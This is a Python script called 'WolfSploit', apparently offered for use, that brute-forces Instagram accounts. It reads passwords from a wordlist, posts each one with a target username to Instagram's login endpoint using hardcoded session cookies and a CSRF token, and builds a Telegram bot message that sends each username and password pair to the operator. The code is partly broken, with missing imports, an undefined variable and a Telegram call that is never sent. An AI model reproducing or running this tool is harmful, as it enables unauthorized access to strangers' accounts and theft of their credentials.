#---------------« intro »---------------

import os
os.system ('clear')
    
#---------------« List00 »---------------    

list00 = 103000000
while list00 < 99999999 :
    list00 = lists00 + 1
    
#---------------« Colours »---------------
	
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح

R = '\033[1;31m' #احمر
Y = '\033[1;33m' #اصفر
R2 = '\033[2;31m' #احمر ثاني
G = '\033[2;32m' #اخضر
B = '\033[2;34m'#ازرق
P = '\033[2;35m' #وردي
C = '\033[2;36m'#سمائي
BW = '\033[1;34m' #ازرق فاتح

#----------------« Logo »-----------------

print (C+'-----------------------«( WolfSploit )»--------------------')

print (P+'>>>>>>> How to use WolfSploit ? <<<<<<<<')
print (P+'.')
print (P+'.')
print (P+'.')
print (P+'↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓')

print (C+'1 ====> Create a New bot in Telegram')

print (Y+'2 ====> Open the script')
print (G+'3 ====> Put your Telegram ID ')

print (R+'4 ====> Put your Telegram bot token') 

print (C+'5 ====> Put you listword script')

print (B+'6 ====> Receiving Instgram Accounts in Telegram bot')

print (P+'↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑')
#---------------« Space »---------------

print (B+'.')
print (B+'.')
print (B+'.')

#---------------« Project »---------------		
ID = input(F+'Enter Your Id : ')

token = input('Enter your token bot : ')


r = requests.Session()

file = input('  - Enter Name File : ')
rfile = open(file, 'r')

while True:
	username =  input(' - Enter Target : ')
	password = rfile.readline().split('\n')[0]
	
	url = 'https://www.instagram.com/accounts/login/ajax/'
		
		
	headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}
         
         
	data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}


	req_login = r.post(url, headers=headers, data=data, proxies=None)
	
	
	
	
	
	
	
	
	tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 𝑯𝒆𝒍𝒍𝒐 - 𝒀𝒐𝒖𝑹 𝑯𝒖𝒏𝒕 ♔︎
\n- 𝑷𝑯 ➪ {username} ✓\n- 𝑷𝑺 ➪ {password} \n━━━━━━━━━━━━━\n• 𝐅𝐫𝐎𝐦 : @YYYY02 -K- @YYYY04 ''')

	